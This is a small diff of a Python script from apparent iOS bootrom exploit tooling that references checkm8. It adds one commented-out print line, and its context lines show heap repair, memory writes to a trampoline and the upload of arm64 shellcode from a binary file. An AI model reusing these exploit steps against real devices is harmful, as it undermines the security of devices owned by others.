@@ -405,6 +405,7 @@ if __name__ == '__main__':
                 device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180)
                 device.execute(0, HEAP_CHECK_ALL)
                 print 'Heap repaired.'
+                # print 'Shellcode uploaded'
 
                 device.write_memory(TRAMPOLINE, checkm8.asm_arm64_branch(TRAMPOLINE, TRAMPOLINE + 0x620))
                 device.write_memory(TRAMPOLINE + 0x620, open('bin/t8015_shellcode_arm64.bin').read())
